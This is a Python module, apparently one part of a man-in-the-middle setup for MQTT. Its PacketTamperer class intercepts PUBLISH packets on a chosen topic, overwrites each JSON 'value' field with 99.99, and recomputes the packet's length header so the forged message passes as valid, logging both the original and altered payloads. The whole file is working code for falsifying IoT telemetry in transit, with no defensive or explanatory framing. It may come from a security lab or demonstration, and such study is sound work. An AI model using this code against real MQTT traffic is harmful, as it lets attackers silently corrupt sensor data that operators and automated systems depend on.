from common.config import TOPIC

VALUE_PATTERN = None  # set below to avoid importing re twice
import re

VALUE_PATTERN = re.compile(rb'"value"\s*:\s*[\d.]+')
TAMPERED_VALUE = b'"value": 99.99'

# MQTT packet types (high nibble of the fixed header first byte)
PUBLISH = 3


class PacketTamperer:
    @staticmethod
    def encode_remaining_length(n: int) -> bytes:
        out = bytearray()
        while True:
            digit = n % 128
            n //= 128
            if n > 0:
                digit |= 0x80
            out.append(digit)
            if n == 0:
                break
        return bytes(out)

    @staticmethod
    def tamper_publish(packet: bytes) -> bytes:
        """Rewrite the JSON value inside a PUBLISH packet, keeping MQTT framing valid."""
        first = packet[0]
        if (first >> 4) != PUBLISH:
            return packet

        # Re-parse the fixed header to know where the body starts
        multiplier = 1
        remaining = 0
        i = 1
        while True:
            byte = packet[i]
            remaining += (byte & 0x7F) * multiplier
            i += 1
            if not (byte & 0x80):
                break
            multiplier *= 128
        body_start = i
        body = packet[body_start:]

        # Variable header: topic length (2 bytes) + topic + optional packet-id (QoS>0)
        if len(body) < 2:
            return packet
        topic_len = int.from_bytes(body[0:2], "big")
        topic_end = 2 + topic_len
        if len(body) < topic_end:
            return packet
        topic = body[2:topic_end]
        if topic != TOPIC.encode():
            return packet

        qos = (first >> 1) & 0x03
        pid_len = 2 if qos > 0 else 0
        payload_start = topic_end + pid_len
        payload = body[payload_start:]

        new_payload = VALUE_PATTERN.sub(TAMPERED_VALUE, payload)
        if new_payload == payload:
            return packet

        new_body = body[:payload_start] + new_payload
        new_first = first
        new_header = bytes([new_first]) + PacketTamperer.encode_remaining_length(
            len(new_body)
        )
        tampered = new_header + new_body

        print(f"[PacketTamperer] Actual Payload -> {payload}")
        print(f"[PacketTamperer] tampered Payload -> {new_payload}")
        return tampered
